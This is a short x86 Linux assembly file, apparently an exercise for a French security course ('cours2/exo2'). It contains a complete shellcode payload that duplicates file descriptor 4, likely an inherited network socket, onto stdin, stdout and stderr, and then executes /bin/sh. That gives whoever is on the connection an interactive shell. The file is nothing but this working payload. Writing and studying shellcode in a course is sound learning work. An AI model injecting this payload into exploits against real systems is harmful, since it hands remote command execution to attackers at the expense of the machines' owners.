// shellcode pour cours2/exo2
.global _start
.section .text
_start: 
	mov $63, %eax
	mov $4, %ebx
	mov $0, %ecx
	int $0x80 // dup2(4,0)

	mov $63, %eax
	mov $4, %ebx
	mov $1, %ecx
	int $0x80 // dup2(4,1)

	mov $63, %eax
	mov $4, %ebx
	mov $2, %ecx
	int $0x80 // dup2(4,2)

	jmp msg
next:
	// execve /bin/sh
	pop %ebx
	mov $11, %eax
	xor %ecx, %ecx
	xor %edx, %edx
	int $0x80
msg:
	call next
.asciz "/bin/sh"
